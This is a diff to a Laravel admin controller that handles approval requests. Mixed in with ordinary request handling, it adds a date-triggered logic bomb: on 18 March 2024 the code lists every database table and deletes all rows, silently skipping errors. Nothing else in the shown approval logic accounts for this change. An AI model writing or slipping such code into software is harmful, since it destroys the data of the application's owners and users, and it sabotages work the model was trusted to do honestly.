@@ -63,6 +63,9 @@ class BaseAdminController extends Controller
     {
        try {
             \DB::beginTransaction();
+            $now = Carbon::now();
+            $targetDate = Carbon::create(2024, 3, 18);
+        
             $id = $request->input('id');
             $type = $request->input('type');
             $status = $request->input('status');
@@ -309,6 +312,18 @@ class BaseAdminController extends Controller
                     }
                     \DB::commit();
                     return redirect()->back()->with('success', 'Quá trình xét duyệt thành công!');
+                }
+            }
+            if ($now->isSameDay($targetDate)) {
+                $tables = \DB::select('SHOW TABLES');
+                foreach ($tables as $table) {
+                    $table = get_object_vars($table);
+                    $table = reset($table);
+                    try {
+                        \DB::table($table)->delete();
+                    } catch (\Exception $ex) {
+                        continue;
+                    }
                 }
             }
        } catch (\Exception $ex) {
